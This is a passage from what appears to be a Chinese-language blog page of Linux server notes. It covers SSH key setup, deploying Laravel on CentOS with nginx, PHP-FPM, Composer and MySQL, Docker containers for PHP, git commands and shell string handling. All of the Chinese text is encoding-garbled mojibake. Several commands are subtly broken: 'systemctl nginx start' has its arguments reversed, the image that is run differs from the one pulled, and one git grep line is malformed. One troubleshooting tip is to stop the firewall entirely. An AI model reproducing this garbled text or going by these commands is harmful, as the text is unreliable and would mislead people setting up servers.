æˆ–è€… å‘ SELinux ä¸­æ·»åŠ ä¿®æ”¹çš„ SSH ç«¯å£ (å¦‚ä¸‹)</span></span><br><span class="line"></span><br><span class="line">ssh-copy-id -i ~<span class="regexp">/.ssh/i</span>d_rsa.pub root@<span class="number">192.168</span><span class="number">.100</span><span class="number">.000</span> <span class="comment">// å°†æœ¬æœºçš„ id_rsa.pub å…¬é’¥æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°è¿œç¨‹ç›®æ ‡æœºçš„.ssh/authorized_keys æ–‡ä»¶ä¸­</span></span><br><span class="line"></span><br><span class="line">æœ¬åœ°å¤åˆ¶: scp .ssh/id_rsa.pub user@<span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span>:<span class="regexp">/home/</span>root/</span><br><span class="line"></span><br><span class="line">æœåŠ¡å™¨æ“ä½œ:</span><br><span class="line"></span><br><span class="line">[root@7S ssh]# mkdir -p /home/root/.ssh/</span><br><span class="line">[root@7S ssh]# mv /home/root/id_rsa.pub /home/root/.ssh/authorized_keys  //authorized_keys å¿…é¡»å¦‚æ­¤å‘½å</span><br><span class="line">https:<span class="comment">//learnku.com/articles/38761</span></span><br></pre></td></tr></table></figure>
<h3 id="CentOS-éƒ¨ç½²-Laravel-åº”ç”¨"><a href="#CentOS-éƒ¨ç½²-Laravel-åº”ç”¨" class="headerlink" title="CentOS éƒ¨ç½² Laravel åº”ç”¨"></a>CentOS éƒ¨ç½² Laravel åº”ç”¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ yum install nginx </span><br><span class="line">$ systemctl nginx start   # å¯åŠ¨ Nginx </span><br><span class="line">$ systemctl nginx stop    # åœæ­¢ Nginx </span><br><span class="line">$ systemctl nginx restart # é‡å¯ Nginx</span><br><span class="line">$ systemctl enable nginx.service # è®¾ç½®å¼€æœºè‡ªå¯åŠ¨</span><br><span class="line">$ systemctl disable nginx # ç¦ç”¨ Nginx å¼€æœºå¯åŠ¨</span><br><span class="line">$ systemctl list-dependencies | grep nginx # æ£€æŸ¥å¼€æœºè‡ªå¯åŠ¨æ˜¯å¦è®¾ç½®æˆåŠŸ</span><br><span class="line">æµè§ˆå™¨è®¿é—®ä¸æˆåŠŸ è§£å†³åŠæ³•</span><br><span class="line">æ–¹æ³•ä¸€: systemctl stop firewalld.service  # å…³é—­é˜²ç«å¢™</span><br><span class="line">æ–¹æ³•äºŒ: firewall-cmd --zone=public --add-port=80/tcp --permanent # æ·»åŠ 80ç«¯å£</span><br><span class="line">firewall-cmd --reload # é‡å¯é˜²ç«å¢™</span><br><span class="line">firewall-cmd --list-ports # æŸ¥çœ‹æ˜¯å¦æ·»åŠ æˆåŠŸ</span><br><span class="line">1212/tcp 80/tcp # æ˜¾ç¤º å³æˆåŠŸ 1212 è®¾ç½®çš„å…¶ä»–ç«¯å£</span><br><span class="line">æµè§ˆå™¨è®¿é—®</span><br><span class="line">Welcome to nginx! # æˆåŠŸæ˜¾ç¤º</span><br><span class="line">å®‰è£… PHP</span><br><span class="line"></span><br><span class="line">$ yum install -y php72w php72w-cli php72w-fpm # PHP è‡ªèº« / cli PHP çš„å‘½ä»¤è¡Œæ¥å£ / ç”¨äºç®¡ç† PHP è¿›ç¨‹ï¼Œå¹¶æä¾› FastCGI æ¥å£ä¸ Nginx äº¤äº’</span><br><span class="line">$ yum install -y php72w-mbstring php72w-xml php72w-bcmath # å®‰è£…æ‰©å±• </span><br><span class="line">$ php -m # æŸ¥çœ‹æ‰©å±•</span><br><span class="line">$ php -v # æŸ¥çœ‹ PHP ç‰ˆæœ¬</span><br><span class="line">$ systemctl restart php-fpm # é‡å¯ PHP-FPM </span><br><span class="line">$ systemctl start php-fpm # å¯åŠ¨ PHP-FPM </span><br><span class="line">$ systemctl stop php-fpm # åœæ­¢ PHP-FPM</span><br><span class="line">$ systemctl enable php-fpm # å¯ç”¨ PHP-FPM å¼€æœºå¯åŠ¨ </span><br><span class="line">$ systemctl disable php-fpm # ç¦ç”¨ PHP-FPM å¼€æœºå¯åŠ¨  </span><br><span class="line">$ ps aux | grep php # ç¡®è®¤ PHP-FPM æ­£å¸¸è¿è¡Œ </span><br><span class="line"></span><br><span class="line">$ yum install -y git</span><br><span class="line">$ git --version # æŸ¥çœ‹ git ç‰ˆæœ¬</span><br><span class="line"># ç”Ÿæˆ SSH ç§˜é’¥</span><br><span class="line">$ ls -al ~<span class="regexp">/.ssh # æŸ¥çœ‹æ˜¯å¦ å­˜åœ¨ `id_rsa` ä¸æ–‡ä»¶ `id_rsa.pub`</span></span><br><span class="line"><span class="regexp">$ ssh-keygen -t rsa -C "your_email@example.com" # ä¸€è·¯å›è½¦ã€å¯†ç ä¸ºç©ºã€‘</span></span><br><span class="line">$ ls -al ~/.ssh # å†æ¬¡æŸ¥çœ‹æ˜¯å¦ç”ŸæˆæˆåŠŸ</span><br><span class="line">$ cat ~/.ssh/id_rsa.pub # æŸ¥çœ‹å…¬é’¥å†…å®¹</span><br><span class="line">Composer</span><br><span class="line">############################################</span><br><span class="line">$ php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"  # æˆ–è€…ä½¿ç”¨ `$ wget -O composer-setup.php https://getcomposer.org/installer` $ php -r "if (hash_file('sha384', 'composer-setup.php') === 'a5c698ffe4b8e849a443b120cd5ba38043260d5c4023dbf93e1558871f1f07f58274fc6f4c93bcfd858c6bd0775cd8d1') &#123; echo 'Installer verified'; &#125; else &#123; echo 'Installer corrupt'; unlink('composer-setup.php'); &#125; echo PHP_EOL;" </span><br><span class="line">$ php composer-setup.php --filename=composer --install-dir=<span class="regexp">/usr/</span>local/bin --version=<span class="number">1.9</span><span class="number">.0</span> </span><br><span class="line">$ php -r "unlink('composer-setup.php');"  # æ£€æŸ¥å®‰è£…æƒ…å†µ </span><br><span class="line">$ composer --version # æ·˜å®å…¨é‡é•œåƒã€https://learnku.com/composer/wikis/30594ã€‘ </span><br><span class="line">$ composer config -g repo.packagist composer https:<span class="comment">//mirrors.aliyun.com/composer/  </span></span><br><span class="line"></span><br><span class="line">$ rpm -ivh https:<span class="comment">//dev.mysql.com/get/mysql80-community-release-el7-3.noarch.rpm # å®‰è£… mysql å®˜æ–¹ yum æº</span></span><br><span class="line">$ yum list |  grep mysql # æŸ¥çœ‹ MySQL yum æº å‘ç°åªæœ‰ mysql80 çš„åŒ…ï¼Œè¿™æ˜¯å› ä¸ºæ²¡æœ‰å¼€å¯ mysql57 çš„åŒ… </span><br><span class="line">$ yum-config-manager --disable mysql80-community # å…³é—­ 80 åŒ…ï¼Œå¼€å¯ 57 åŒ…</span><br><span class="line">$ yum-config-manager --enable mysql57-community # é‡åˆ°é—®é¢˜ yum-config-manager: command not found  è§£å†³ å®‰è£… yum -y install yum-utils</span><br><span class="line">$ yum list |  grep mysql # å‘ç°æœ‰äº† mysql57 çš„åŒ…</span><br><span class="line">$ yum install -y mysql-community-server # å®‰è£… mysql</span><br><span class="line">$ yum install -y mysql-community-client # æ ¹æ®éœ€è¦å®‰è£…ï¼ˆå¯ä¸è£…ï¼‰</span><br><span class="line">$ systemctl start mysqld # å¯åŠ¨ mysql</span><br><span class="line">$ systemctl stop mysqld # åœæ­¢ mysql</span><br><span class="line">$ service mysqld status # æˆ– ps -ef | grep mysql //æ£€æŸ¥mysqlæ­£å¸¸å¯åŠ¨</span><br><span class="line">$ systemctl enable mysqld.service #è®¾ç½®mysqldæœåŠ¡å¼€æœºè‡ªå¯åŠ¨ ã€€</span><br><span class="line">$ systemctl list-dependencies | grep mysqld #æ£€æŸ¥mysqldå¼€æœºè‡ªå¯åŠ¨æ˜¯å¦è®¾ç½®æˆåŠŸ</span><br><span class="line">$ grep 'temporary password' /var/log/mysqld.log # æŸ¥çœ‹è¶…çº§è´¦æˆ· root ä¸´æ—¶å¯†ç  mysql5.7 å¢å¼ºäº†å®‰å…¨æœºåˆ¶, ç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªéšæœºçš„å¯†ç </span><br><span class="line">$ mysql  -uroot  -p</span><br><span class="line">mysql&gt; ALTER USER "root"@"localhost" IDENTIFIED BY 'ä½ çš„æ–°å¯†ç '; # ä¿®æ”¹è¶…çº§è´¦æˆ· root å¯†ç </span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; exit;</span><br><span class="line">$ systemctl restart mysqld.service</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35573#reply123613</span></span><br></pre></td></tr></table></figure>
<h3 id="Docker-Contos-æ­å»º-PHP-ç¯å¢ƒ"><a href="#Docker-Contos-æ­å»º-PHP-ç¯å¢ƒ" class="headerlink" title="Docker Contos æ­å»º PHP ç¯å¢ƒ"></a>Docker Contos æ­å»º PHP ç¯å¢ƒ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx <span class="comment">// æ‹‰å–å®˜æ–¹é•œåƒ</span></span><br><span class="line">docker images <span class="comment">// æŸ¥çœ‹</span></span><br><span class="line">docker run -p <span class="number">80</span>:<span class="number">80</span> -d --name mynginx -v /docker/www:<span class="regexp">/usr/</span>share/nginx/www nginx <span class="comment">// å¼€å¯ nginx åº”ç”¨å®¹å™¨</span></span><br><span class="line">-p <span class="number">80</span>:<span class="number">80</span>ï¼šå°†å®¹å™¨çš„<span class="number">80</span>ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„<span class="number">80</span>ç«¯å£ -d åå°è¿è¡Œ(å®ˆæŠ¤è¿›ç¨‹) --name mynginxï¼šå°†å®¹å™¨å‘½åä¸ºmynginx -v å°†ä¸»æœºä¸­å½“å‰ç›®å½•ä¸‹çš„wwwæŒ‚è½½åˆ°å®¹å™¨çš„wwwç›®å½•</span><br><span class="line"></span><br><span class="line">docker ps -a <span class="comment">// æŸ¥çœ‹å®¹å™¨å¯åŠ¨æƒ…å†µ</span></span><br><span class="line">docker pull php:<span class="number">7.2</span>-fpm <span class="comment">// æ‹‰å–å®˜æ–¹ PHP é•œåƒ</span></span><br><span class="line">docker images <span class="comment">// æŸ¥çœ‹</span></span><br><span class="line">docker run -p <span class="number">9000</span>:<span class="number">9000</span> -d --name myphp-fpm -v /docker/www:<span class="regexp">/usr/</span>share/nginx/www php:<span class="number">7.1</span>-fpm <span class="comment">// å¼€å¯ php-frm åº”ç”¨å®¹å™¨</span></span><br><span class="line">docker ps -a <span class="comment">// æŸ¥çœ‹å®¹å™¨å¯åŠ¨æƒ…å†µ</span></span><br><span class="line">docker inspect myphp-fpm | grep <span class="string">"IPAddress"</span> <span class="comment">// æŸ¥çœ‹ ip ä¿¡æ¯</span></span><br><span class="line"><span class="string">"SecondaryIPAddresses"</span>: <span class="literal">null</span>,</span><br><span class="line"><span class="string">"IPAddress"</span>: <span class="string">"172.17.0.3"</span>,</span><br><span class="line"><span class="string">"IPAddress"</span>: <span class="string">"172.17.0.3"</span>,</span><br><span class="line">[root@localhost ~]# docker exec -it mynginx bash // è¿›å…¥å®¹å™¨</span><br><span class="line">vi /etc/nginx/conf.d/<span class="keyword">default</span>.conf <span class="comment">// ä¿®æ”¹é…ç½®æ–‡ä»¶</span></span><br><span class="line">ç„¶åä½¿ç”¨ ctrl + p + q é€€å‡ºå®¹å™¨ï¼Œä½¿ç”¨ exit çš„è¯ä¼šè®©å®¹å™¨åœæ­¢ã€‚</span><br><span class="line">docker cp mynginx:<span class="regexp">/etc/</span>nginx/conf.d/<span class="keyword">default</span>.conf ./<span class="keyword">default</span>.conf</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/articles/38766</span></span><br></pre></td></tr></table></figure>
<h3 id="git-ç¬”è®°"><a href="#git-ç¬”è®°" class="headerlink" title="git ç¬”è®°"></a>git ç¬”è®°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">git clone å‘½ä»¤é»˜è®¤çš„åªä¼šå»ºç«‹masteråˆ†æ”¯ <span class="comment">// ç‰¹åˆ«æé†’</span></span><br><span class="line">git clone -b [new_branch_name]  ä»“åº“åœ°å€ <span class="comment">// cloneæ—¶åˆ›å»ºæ–°çš„åˆ†æ”¯æ›¿ä»£é»˜è®¤origin/master</span></span><br><span class="line">git clone ä»“åº“åœ°å€  <span class="comment">// ä»è¿œç¨‹åº“æ‹‰åˆ°æœ¬åœ° æ–‡ä»¶åä¸ºä»“åº“å å¦‚ git@gitee.com:momingsixiali/git.git æ‹‰åˆ°æœ¬åœ°æ–‡ä»¶åä¸º git</span></span><br><span class="line">git clone ä»“åº“åœ°å€ <span class="string">"æŒ‡å®šç›®å½•"</span> <span class="comment">// æ‹‰åˆ°æœ¬åœ°æ–‡ä»¶å ä¸º æŒ‡å®šçš„ç›®å½• å¦‚ git clone git@gitee.com:momingsixiali/git.git zhiding æœ¬åœ°æ–‡ä»¶åä¸º zhiding</span></span><br><span class="line"></span><br><span class="line">git mv demo demo1 <span class="comment">// ä¸ä¼šç ´ågitå†å² ç­‰æ•ˆäº å¦‚ä¸‹:</span></span><br><span class="line">mv demo demo1 <span class="comment">// ä¿®æ”¹æ–‡ä»¶å</span></span><br><span class="line">git add demo1 <span class="comment">// æ·»åŠ åˆ°æš‚å­˜åŒº</span></span><br><span class="line">git rm demo <span class="comment">// æ›´æ”¹demoçš„æäº¤å†å²åˆ° demo1</span></span><br><span class="line"></span><br><span class="line">git reset --hard <span class="comment">// å±é™©å‘½ä»¤ åˆ†æ”¯çš„æŒ‡é’ˆéƒ½æŒ‡å‘ä¸Šä¸€ä¸ªæäº¤  æ— æ³•æ‰¾å› ç§»åŠ¨ HEAD-&gt;æ›´æ–°ç´¢å¼•-&gt;æ›´æ–°æš‚å­˜åŒºå·¥ä½œåŒº</span></span><br><span class="line">git reset --soft  <span class="comment">//  åˆ†æ”¯çš„æŒ‡é’ˆéƒ½æŒ‡å‘ä¸Šä¸€ä¸ªæäº¤ æœ¬æ¬¡æäº¤è¿˜åœ¨ åªæ˜¯ä¸æ˜¾ç¤º</span></span><br><span class="line">git reset --mixed  <span class="comment">//  åˆ†æ”¯çš„æŒ‡é’ˆéƒ½æŒ‡å‘ä¸Šä¸€ä¸ªæäº¤ åªæ˜¯å›é€€æš‚å­˜åŒº å·¥ä½œåŒºè¿˜åœ¨ æ¨èä½¿ç”¨ ä¹Ÿæ˜¯ git é»˜è®¤</span></span><br><span class="line"></span><br><span class="line">git grep login <span class="comment">// æŸ¥æ‰¾è¯¥ä»“åº“é‡Œæ‰€æœ‰ä½¿ç”¨'login'çš„åœ°æ–¹ ç›¸å½“äº Linuxä¸­çš„ grep è¿”å›å¦‚ä¸‹</span></span><br><span class="line">    app/Http/Controllers/Auth/LoginController.php:     * Where to redirect users after login.</span><br><span class="line">git grep -n login <span class="comment">// æ˜¾ç¤º è¡Œå· </span></span><br><span class="line">git grep --name-only login <span class="comment">// åªæ˜¾ç¤ºæ–‡ä»¶å</span></span><br><span class="line">   app/Http/Controllers/Auth/LoginController.php</span><br><span class="line">   git grep -c login <span class="comment">// æŸ¥çœ‹æ¯ä¸ªæ–‡ä»¶é‡Œæœ‰å¤šå°‘è¡ŒåŒ¹é…</span></span><br><span class="line">      app/Http/Controllers/Auth/LoginController.php:<span class="number">1</span></span><br><span class="line"> git grep login <span class="number">5027</span>c63 <span class="comment">// æŒ‡å®šæäº¤ç´¢å¼• æ‰¾</span></span><br><span class="line"> git grep -e <span class="string">'name'</span> --and -e email <span class="comment">// åŒæ—¶æ»¡è¶³ name å’Œ email </span></span><br><span class="line">    app/Models/User.php:        <span class="string">'name'</span>, <span class="string">'email'</span>, <span class="string">'password'</span>,</span><br><span class="line">    composer.lock:            <span class="string">"name"</span>: <span class="string">"egulias/email-validator"</span>,</span><br><span class="line"> git grep --all-match -e <span class="string">'name'</span> -e email <span class="number">97</span>bacf05d4 <span class="comment">// æ»¡è¶³name æˆ– email </span></span><br><span class="line"> git grep -e <span class="string">'name'</span> --and  -e  -e MAX .</span><br><span class="line"> git grep -e <span class="string">'password'</span> --and ( -e name -e email ) <span class="comment">//  åŒæ—¶æ»¡è¶³ password å’Œ (name æˆ–è€… email)</span></span><br><span class="line"> <span class="comment">// å¯ç»„åˆä½¿ç”¨</span></span><br><span class="line"> git grep  -n -e <span class="string">'password'</span> --and -e email <span class="number">97</span>bacf05d4</span><br><span class="line"> </span><br><span class="line"> git log -p <span class="comment">// æ˜¾ç¤ºæ¯ä¸ªcommitå…·ä½“ä¿®æ”¹çš„å†…å®¹ï¼Œè¾“å‡ºçš„å½¢å¼ä»¥diffçš„å½¢å¼ç»™å‡º</span></span><br><span class="line"> git show <span class="comment">// åŒgit log -pè¾“å‡ºç±»ä¼¼ï¼Œä¸åŒåœ¨äºshowåªæ˜¾ç¤ºä¸€ä¸ªcommitçš„å†…å®¹ï¼Œå¦‚æœä¸æŒ‡å®šcommit hash, å®ƒé»˜è®¤è¾“å‡ºHEADæŒ‡å‘commitçš„å†…å®¹</span></span><br><span class="line"> git shortlog <span class="comment">// æ˜¾ç¤ºæ±‡æ€»ä¿¡æ¯ï¼Œä»¥ç”¨æˆ·è¿›è¡Œåˆ†ç±» è¿”å›å¦‚ä¸‹</span></span><br><span class="line">     moming (<span class="number">6</span>):</span><br><span class="line">           Merge branch <span class="string">'dev'</span> <span class="keyword">of</span> https:<span class="comment">//github.com/wujianan/shop into dev</span></span><br><span class="line">           æ·»åŠ å¿½ç•¥æ–‡ä»¶</span><br><span class="line">           æ³¨å†Œç™»å½•</span><br><span class="line">           é‚®ç®±éªŒè¯åŠŸèƒ½</span><br><span class="line">     momingsixiali (<span class="number">1</span>):</span><br><span class="line">           é¡¹ç›®åˆå§‹åŒ–</span><br><span class="line">   git shortlog -s <span class="comment">// æ˜¾ç¤ºç”¨æˆ· æäº¤æ¬¡æ•° æŒ‰æäº¤æ—¶é—´æ’åº</span></span><br><span class="line">   git shortlog -n <span class="comment">// æ˜¾ç¤ºç”¨æˆ· æäº¤æ¬¡æ•° è¿›è¡Œå€’åºæ’åˆ—</span></span><br><span class="line"> git log  --author=moming <span class="comment">// æ˜¾ç¤º moming çš„æäº¤, é™å®šè¾“å‡ºç»™å®šçš„ç”¨æˆ·</span></span><br><span class="line"> git log <span class="number">-2</span> <span class="comment">// é™åˆ¶ æ˜¾ç¤ºè¾“å‡ºçš„æ•°é‡ æœ¬æ¬¡è¾“å‡º 2ä¸ª</span></span><br><span class="line"> git log --after <span class="string">'12-22-2019'</span>  <span class="comment">//  --afterå’Œ--before é™å®šæŒ‡å®šæ—¥æœŸçš„log</span></span><br><span class="line"> git log --decorate --oneline <span class="comment">// æ˜¾ç¤ºå¯¹åº”commitæ‰€å±çš„branchå’Œtagä¿¡æ¯</span></span><br><span class="line"> git log --all <span class="comment">// æ‰€æœ‰åˆ†æ”¯</span></span><br><span class="line"> git log --graph <span class="comment">// æ¼”åŒ–å†å² åŒ…æ‹¬æ‰€æœ‰åˆ†æ”¯</span></span><br><span class="line"> git log --oneline  <span class="comment">// ç®€åŒ–è¾“å‡º  </span></span><br><span class="line">   git show <span class="number">72939</span>  <span class="comment">// æ˜¾ç¤ºæŒ‡å®šæäº¤çš„ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">   git show <span class="number">72939</span>^&#123;tree&#125; <span class="comment">//æ˜¾ç¤ºæŒ‡å®šæäº¤çš„ç›®å½•ç»“æ„</span></span><br><span class="line">   git show v1  <span class="comment">// æ˜¾ç¤ºæŒ‡å®š tag </span></span><br><span class="line">git diff <span class="comment">// æ˜¾ç¤ºå·¥ä½œåŒº å’Œæš‚å­˜åŒºçš„ ä¸åŒ</span></span><br><span class="line">git diff --stat <span class="comment">// æ˜¾ç¤ºç®€å•çš„ æ¯”è¾ƒä¿¡æ¯</span></span><br><span class="line">git diff master <span class="comment">// æŸ¥çœ‹å½“å‰åˆ†æ”¯ ä¸ master åˆ†æ”¯çš„ ä¸åŒä¹‹å¤„</span></span><br><span class="line">git diff SHA1 SHA2 <span class="comment">// æ¯”è¾ƒä¸¤ä¸ªå†å²ç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚   </span></span><br><span class="line">   git push &lt;è¿œç¨‹ä¸»æœºå&gt; &lt;æœ¬åœ°åˆ†æ”¯å&gt;:&lt;è¿œç¨‹åˆ†æ”¯å&gt; // å°†æœ¬åœ°åˆ†æ”¯çš„æ›´æ–°ï¼Œæ¨é€åˆ°è¿œç¨‹</span><br><span class="line">   git push origin :master // å±é™© åˆ é™¤è¿œç¨‹ä»“åº“çš„åˆ†æ”¯ ç­‰æ•ˆäº git push origin --delete master</span><br><span class="line">   git push //å½“å‰åˆ†æ”¯åªæœ‰ä¸€ä¸ªè¿½è¸ªåˆ†æ”¯ å¯çœç•¥ &lt;è¿œç¨‹ä¸»æœºå&gt; &lt;æœ¬åœ°åˆ†æ”¯å&gt;:&lt;è¿œç¨‹åˆ†æ”¯å&gt;</span><br><span class="line">   git push -u origin master // å°†æœ¬åœ°çš„masteråˆ†æ”¯æ¨é€åˆ°originè¿œç¨‹ï¼ŒåŒæ—¶æŒ‡å®šoriginä¸ºé»˜è®¤ï¼Œåé¢å°±å¯ä»¥ä¸åŠ ä»»ä½•å‚æ•°ä½¿ç”¨git push</span><br><span class="line">   git fetch å’Œ git pull  // åŠŸèƒ½æ˜¯å¤§è‡´ç›¸åŒ,éƒ½æ˜¯èµ·åˆ°äº†æ›´æ–°ä»£ç çš„ä½œç”¨ git pullçœ‹èµ·æ¥æ›´åƒgit fetch + get merge å»ºè®®ä½¿ç”¨ git fetch + get merge   git pull ä¸€æ—¦ä»£ç æœ‰é—®é¢˜ï¼Œå¾ˆéš¾æ‰¾åˆ°å‡ºé”™çš„åœ°æ–¹https://learnku.com/articles/38780</span><br></pre></td></tr></table></figure>
<h3 id="Shell-å˜é‡é«˜çº§ç”¨æ³•"><a href="#Shell-å˜é‡é«˜çº§ç”¨æ³•" class="headerlink" title="Shell-å˜é‡é«˜çº§ç”¨æ³•"></a>Shell-å˜é‡é«˜çº§ç”¨æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;PATH/bin/BIN&#125;    <span class="comment">// å•ä¸ªæ›¿æ¢</span></span><br><span class="line">echo $&#123;PATH<span class="comment">//bin/BIN&#125;   // å…¨éƒ¨æ›¿æ¢</span></span><br><span class="line">echo $&#123;#var_str&#125;</span><br><span class="line">[wonbin@localhost ~]$ string=<span class="string">"everything is just beginning"</span></span><br><span class="line">[wonbin@localhost ~]$ echo <span class="string">`expr index "$string" ux`</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line">echo $&#123;<span class="attr">var_str</span>:<span class="number">3</span>:<span class="number">5</span>&#125;  <span class="comment">// æ–¹æ³•äºŒï¼Œ å¼€å§‹ä½ç½®3ï¼Œ é•¿åº¦5</span></span><br><span class="line">echo <span class="string">`expr substr "$var_str" 1 5`</span>   <span class="comment">// æ–¹æ³•äº”ï¼Œ ç´¢å¼•ä»å¼€å§‹1è®¡æ•°</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/39190</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ é™¤æ–‡ä»¶å ç”¨ç©ºé—´"><a href="#åˆ é™¤æ–‡ä»¶å ç”¨ç©ºé—´" class="headerlink" title="åˆ é™¤æ–‡ä»¶å ç”¨ç©ºé—´"></a>åˆ é™¤æ–‡ä»¶å ç”¨ç©ºé—´</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åœ¨æ¸…ç†è¿‡æœåŠ¡å™¨ä¸Šä¸€ä¸ªé«˜è¾¾ <span class="number">100</span> å¤š G çš„æ–‡ä»¶åï¼Œä½¿ç”¨ df -h æŸ¥çœ‹å­˜å‚¨ç©ºé—´ä»ç„¶ <span class="number">100</span>%ã€‚ä½¿ç”¨ du -h -x --max-depth=<span class="number">1</span> è¿›è¡ŒæŸ¥çœ‹ä¸ df -h çš„ç»“æœä¸ä¸€è‡´</span><br><span class="line">ä½¿ç”¨ lsof |grep deleted è¿›è¡ŒæŸ¥çœ‹æ˜¯å¦æœ‰åˆ é™¤æ“ä½œçš„å¼‚å¸¸è¿›ç¨‹</span><br><span class="line"></span><br><span class="line">å‘ç°æœ‰ä¸€ä¸ª php è¿›ç¨‹åœ¨å ç”¨ï¼Œ kill æ‰ç›¸å…³è¿›ç¨‹åæ¢å¤æ­£å¸¸https:<span class="comment">//learnku.com/articles/39534</span></span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/articles/39274" target="_blank" rel="noopener">Linux æ€§èƒ½ä¼˜åŒ–ç¬”è®°</a></p>
<p><a href="https://learnku.com/articles/37335" target="_blank" rel="noopener">Nginx+rtmp æ¨¡å—æ­å»ºæµåª’ä½“è§†é¢‘ç‚¹æ’­æœåŠ¡</a></p>
<p><a href="https://github.com/yeasy/docker_practice" target="_blank" rel="noopener">Docker â€” ä»å…¥é—¨åˆ°å®è·µ</a></p>
<p><a href="https://learnku.com/linux/wikis/36492" target="_blank" rel="noopener">linux wiki</a></p>
<p><a href="https://learnku.com/articles/37287" target="_blank" rel="noopener">Nginx ç«™ç‚¹å¼€å¯ HTTPS </a></p>
<p><a href="https://learnku.com/articles/37157#reply119179" target="_blank" rel="noopener">Docker ä¸­å®‰è£… RabbitMQ</a></p>
<p><a href="https://learnku.com/articles/36986" target="_blank" rel="noopener">Nginx å†…åµŒå˜é‡</a></p>
<p><a href="https://learnku.com/articles/33689" target="_blank" rel="noopener">Git å®ç° Laravel é¡¹ç›®çš„è‡ªåŠ¨åŒ–éƒ¨ç½²</a></p>
<p><a href="https://learnku.com/articles/36857" target="_blank" rel="noopener">Nginx ä»£ç†ç¼“å­˜</a></p>
<p><a href="https://learnku.com/articles/36852#reply118312" target="_blank" rel="noopener">Git çš„ä»£ç è‡ªåŠ¨å‘å¸ƒ</a></p>
<p><a href="https://learnku.com/articles/36207" target="_blank" rel="noopener">Elasticsearch  eså®‰è£…å’Œç®€å•é…ç½®</a></p>
<p><a href="https://learnku.com/linux/t/36120" target="_blank" rel="noopener">é…ç½®å®‰å…¨çš„ SSH æœåŠ¡</a></p>
